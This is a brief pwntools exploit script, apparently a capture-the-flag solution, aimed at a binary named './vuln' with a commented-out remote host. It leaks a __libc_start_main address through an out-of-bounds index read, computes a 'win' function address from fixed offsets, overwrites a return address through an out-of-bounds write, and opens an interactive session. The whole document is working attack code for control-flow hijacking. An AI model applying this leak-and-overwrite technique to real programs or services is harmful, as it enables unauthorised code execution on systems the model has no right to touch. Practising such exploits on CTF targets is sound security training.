#!/bin/python
from pwn import *
exe = ELF('./vuln')
#
p = process(exe.path)
# p = remote('eth007.me', 42055)
context.terminal = ['alacritty', '-e']
gdb.attach(p, gdbscript='''
b*main+175
           c
           c

           ''')
###############exploiting####################
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'idx: ', b'19')
libc_start_main = int(p.recvline()[:-1],16)
win_addr_leak  = libc_start_main + 0x1f351d
base_leak = win_addr_leak - 4589
main_leak = libc_start_main + 2045240
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'idx: ', b'6')
main_addr = int(p.recvline()[:-1],16)
log.info(f'base_leak: ' + hex(base_leak))
log.info(f'main_addr: ' + hex(main_addr))
log.info(f'libc_start_main: ' + hex(libc_start_main))
log.info(f'main_leak: ' + hex(main_leak))
p.sendlineafter(b'> ', b'2')
p.sendlineafter(b'idx: ', b'19')
p.sendlineafter(b'value: ', str(win_addr_leak + 1).encode())
# p.sendlineafter(b'idx: ', b'-16')
# addr = int(p.recvline()[:-1],16) 
# log.info(f'addr: ' + hex(addr))
##############the end###########################
p.interactive()
